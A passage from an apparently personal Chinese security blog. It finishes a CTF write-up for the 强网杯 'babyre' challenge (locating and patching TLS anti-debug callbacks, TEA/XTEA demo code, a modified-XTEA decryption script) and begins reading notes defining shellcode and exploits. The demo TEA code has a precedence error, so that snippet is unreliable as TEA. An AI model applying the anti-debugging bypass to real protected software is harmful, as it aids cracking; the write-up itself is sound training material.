tls_callback,<span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">//这里是个回调函数数组，可以定义多个，可以为空，0必须加上用于结束</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg()</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()                  <span class="hljs-comment">//32位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">//_WIN64</span></span><br></code></pre></td></tr></table></figure></li></ol><p>至于TLS在程序运行过程中的变化应该是这样的：</p><ol><li><strong>OS加载可执行文件，查找所有TLS回调函数，不用从OEP进去后到主线程执行</strong></li><li><strong>OS在重新启动时（或者线程创建销毁），调用TLS回调函数</strong></li><li><strong>进入（返回）主函数</strong></li></ol><h4 id="TEA加密算法"><a href="#TEA加密算法" class="headerlink" title="TEA加密算法"></a>TEA加密算法</h4><p><a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">参考文章</a></p><p>算法特点：</p><ol><li>使用64位(8byte)明文分组和128位密钥(4*32bit,通常是4个8byte数组)</li><li>sum是用于每轮混淆，每次加δ</li><li>使用Feistel分组加密框架（使用上一轮生成的数据和原始数据的另一半进行XOR异或操作，作为下一轮轮函数的输入），一般为32轮</li></ol><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_15-20-48.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9 <span class="hljs-comment">//常数Delta</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *EntryData,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-comment">// 根据算法，分为8字节一轮</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = EntryData[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = EntryData[<span class="hljs-number">1</span>];<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        sum += delta;<br>        v0 += (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        v1 += (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>    &#125;<br>    EntryData[<span class="hljs-number">0</span>] = v0;<br>    EntryData[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-comment">// 解密，加密反过来就行</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        <span class="hljs-comment">// 先算v1</span><br>        v1 -= (v0&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">2</span>])^(v0 + sum)^(v0&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">3</span>]);<br>        v0 -= (v1&lt;&lt;<span class="hljs-number">4</span> + Key[<span class="hljs-number">0</span>])^(v1 + sum)^(v1&gt;&gt;<span class="hljs-number">5</span> + Key[<span class="hljs-number">1</span>]);<br>        sum -= delta;<br>    &#125;<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>&#125;;<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>&#125;;<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;密文：&quot;</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="XTEA加密算法"><a href="#XTEA加密算法" class="headerlink" title="XTEA加密算法"></a>XTEA加密算法</h4><p>XTEA（TEAN）算法相比于TEA的改变在于：<strong>取哪一个密钥通过sum计算得到，而TEA是固定下标</strong></p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-41.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x9E3779B9</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//sum&amp;3:00,01,11</span><br>        sum += delta;<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<span class="hljs-comment">//将sum高五位中的低两位获取</span><br>    &#125;<br>    Data[<span class="hljs-number">0</span>] = v0;<br>    Data[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-comment">// 解密</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = delta*<span class="hljs-number">32</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 =Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 =Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">32</span>;i++)&#123;<br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>)^(v0&gt;&gt;<span class="hljs-number">5</span>) + v0) ^ (sum + Key[(sum&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]);<br>        sum -= delta;<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>)^(v1&gt;&gt;<span class="hljs-number">5</span>) + v1) ^ (sum + Key[sum&amp;<span class="hljs-number">3</span>]);<br>    &#125;<br>    Encrypted_data[<span class="hljs-number">0</span>] = v0;<br>    Encrypted_data[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cout&lt;&lt; <span class="hljs-string">&quot;这是XTEA算法!&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Data[<span class="hljs-number">3</span>]=&#123;<span class="hljs-number">0x48535833</span>,<span class="hljs-number">0x21455230</span>,<span class="hljs-number">0x0</span>&#125;;<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  Key[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x212A3D44</span>,<span class="hljs-number">0x15667788</span>,<span class="hljs-number">0x92AABBCC</span>,<span class="hljs-number">0xD12EFF11</span>&#125;;<br>    <span class="hljs-built_in">Encrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;密文：&quot;</span> &lt;&lt; *Data &lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt; *(Data+<span class="hljs-number">1</span>) &lt;&lt;endl;<br>    <span class="hljs-built_in">Decrypt</span>(Data,Key);<br>    cout &lt;&lt; <span class="hljs-string">&quot;明文：&quot;</span> &lt;&lt; (<span class="hljs-type">char</span>*)Data &lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_21-49-02.png"></p><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><h4 id="解决TLS反调试"><a href="#解决TLS反调试" class="headerlink" title="解决TLS反调试"></a>解决TLS反调试</h4><p>首先我们已经知道了这道题加了TLS反调试，然后学习了具体的原理，现在就是实践中去摸索到底时如何实现的。</p><h5 id="寻觅TLS"><a href="#寻觅TLS" class="headerlink" title="寻觅TLS"></a>寻觅TLS</h5><p>打开IDA调试，首先我们进入到程序入口位置，</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-01-41.png"></p><p>然后一直点击到内层函数，直到此处，重命名为<code>check_DBG</code>，点击进去分析就知道为啥这里是了</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-03-02.png"></p><p>然后里面是这样的：这里已经很明显用了<code>TLS</code>反调试了，如果返回值表示正在被调试，那么直接退出进程；反之才会进入我们的<code>encrypt_func()</code></p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-21_22-05-35.png"></p><p>当然为了更加确认，我们可以在IDA中搜索字符串，发现一个<code>SomeThing Go Wrong\n</code>，点击到该处位置，对函数按<code>x</code>发现交叉引用，发现在两个<code>TLS</code>的<code>callback</code>函数。</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_10-59-22.png"></p><p>点击到一个回调函数分析：和我上面列举的<code>TLS</code>反调试例子就很像了</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_11-06-42.png"></p><p>所以可以发现，<strong>如果存在<code>tlsCallback_</code>之类的函数就得小心了，IDA按<code>shift+F7</code>查看代码段，如果存在<code>.tls</code>也得小心了</strong></p><h5 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h5><p>至此我们确定<code>babyre</code>这道题使用了<code>TLS</code>来反调试，那么接下来的问题就是如何反反调试，<strong>这里首先有个简单的方法，首先自己运行程序，然后用x64dbg附加进程，就可以动态调试了，但是这样不太方便，每次都要重新跑程序。</strong></p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-01-58.png"></p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_17-02-28.png"></p><p>通过上面的方法拿到的密文和密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">E0 F2 23 95 93 C2 D8 8E 93 C3 68 86 BC 50 F2 DD<br>99 44 0E 51 44 BD 60 8C F2 AB DC 34 60 D2 0F C1<br><br>62 6F 6D 62<br></code></pre></td></tr></table></figure><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2023-12-22_15-12-03.png"></p><p>这里采用修改汇编代码的方式把反调试给patch掉，笔者也是第一次做这种操作，太菜了😭</p><p>首先需要定位到在哪里我们可以进入正常的加密算法，在上面我们已经分析出来了，就在我们重命名的<code>check_DBG</code>函数里，接下来计算地址，</p><p>(期末考试ing，未完待续)</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>进入主逻辑中的加密算法，首先有0-1、2-3、4-5、6-7两个一组进去加密，根据我们刚刚拿到的密文，可以发现就是一共4组，每组64bit，和上面的TEA和XTEA的输入要求是一样。</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-01-37.png"></p><p>进入函数分析，发现确实就是一个魔改过的XTEA算法，具体在轮数是33，加密方式变为<code>(v1*5)^(v1&gt;&gt;4)</code>，其他的大差不差的😋</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-01_22-09-55.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Encrypted_data,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum = <span class="hljs-number">0x90508D47</span> - delta*<span class="hljs-number">33</span>*<span class="hljs-number">4</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++)&#123;<br>        sum += delta;<br>        v1 -= ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        v0 -= ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面就是魔改后的XTEA算法的解密脚本，然后在主函数中发现之后还有一个切割逻辑，方便和答案比较，在实际的解密脚本中无需太过关心。</p><p><img src="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/Snipaste_2024-01-03_15-27-02.png"></p><p>下面是完整脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> delta 0x77BF7F99</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x62</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Encrypted_data[] = <br>&#123;<br>    <span class="hljs-number">0xE0</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x8E</span>,<br>    <span class="hljs-number">0x93</span>,<span class="hljs-number">0xC3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0xF2</span>,<span class="hljs-number">0xDD</span>,<br>    <span class="hljs-number">0x99</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x8C</span>,<br>    <span class="hljs-number">0xF2</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xDC</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xC1</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *Data,<span class="hljs-type">uint32_t</span> *Key)</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = Data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">4</span> ;j++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++)&#123;<br>            v0 += ((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>            v1 += ((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            sum -= delta;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> Encrypted_data[<span class="hljs-number">2</span>],<span class="hljs-type">uint32_t</span> Key[<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> sum = <span class="hljs-number">0x90508D47</span>;<span class="hljs-comment">// - delta*33*4;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">33</span>; ++j)<br>        &#123;<br>            sum -= delta;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">uint32_t</span> v0 = Encrypted_data[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">uint32_t</span> v1 = Encrypted_data[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">33</span>;i++)&#123;<br>            sum += delta;<br>            v1 -= (((<span class="hljs-number">32</span>*v0)^(v0&gt;&gt;<span class="hljs-number">4</span>)) + v0) ^ (sum + Key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>            v0 -= (((<span class="hljs-number">32</span>*v1)^(v1&gt;&gt;<span class="hljs-number">4</span>)) + v1) ^ (sum + Key[sum &amp; <span class="hljs-number">3</span>]) ^ sum;<br>        &#125;<br>    &#125;<br>Encrypted_data[<span class="hljs-number">0</span>]=v0;<br>Encrypted_data[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">uint32_t</span> *flag = (<span class="hljs-type">uint32_t</span> *)Encrypted_data;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span> ; i++)&#123;<br>        <span class="hljs-built_in">Decrypt</span>(&amp;flag[i*<span class="hljs-number">2</span>],Key);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,flag);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔3</title>
    <link href="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/"/>
    <url>/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔3"><a href="#0Day安全软件漏洞分析第2版阅读随笔3" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔3"></a>0Day安全软件漏洞分析第2版阅读随笔3</h1><p>​开启第三章的阅读，在第二章学习了基本的栈溢出原理之后，我们已经调试过如何在缓冲区植入代码了，那么接下来将继续学习如何更专业地植入代码，或者说开发<code>shellcode</code>😋</p><span id="more"></span><h2 id="第三章-开发shellcode的艺术"><a href="#第三章-开发shellcode的艺术" class="headerlink" title="第三章-开发shellcode的艺术"></a>第三章-开发shellcode的艺术</h2><p>​<code>shellcode</code>这个专用术语来通称缓冲区溢出攻击中植入进程的代码。这 段代码可以是出于恶作剧目的的弹出一个消息框，也可以是出于攻击目的的删改重要文件、窃取 数据、上传木马病毒并运行，甚至是出于破坏目的的格式化硬盘等。请注意本章讨论的<code>shellcode</code>是这种广义上的植入进程的代码，而不是狭义上的仅仅用来获得 <code>shell</code>的代码。</p><p>​我们还会经常看到另一个术语——<code>exploit</code>。 植入代码之前需要做大量的调试工作，例如，弄清楚程序有几个输入点，这些输入将最终 会当作哪个函数的第几个参数读入到内存的哪一个区域，哪一个输入会造成栈溢出，在复制到栈区的时候对这些数据有没有额外的限制等。调试之后还要计算函数返回地址距离缓冲区的偏 移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着<code>shellcode</code>的输入字符 串。这个代码植入的过程就是漏洞利用，也就是<code>exploit</code>。<code>exploit</code>一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性 输入。<code>expliot</code>的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行<code>shellcode</code>。与<code>shellcode</code>具有一定的通用性不同，<code>exploit</code>往往是针对特定漏洞而言的。</p><p>比如我们在第二章里写的代码：</p><p><img src="/2023/12/12/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%943/Snipaste_2023-12-12_18-40-46.png"></p><h3 id="开发shellcode需要解决的问题"><a 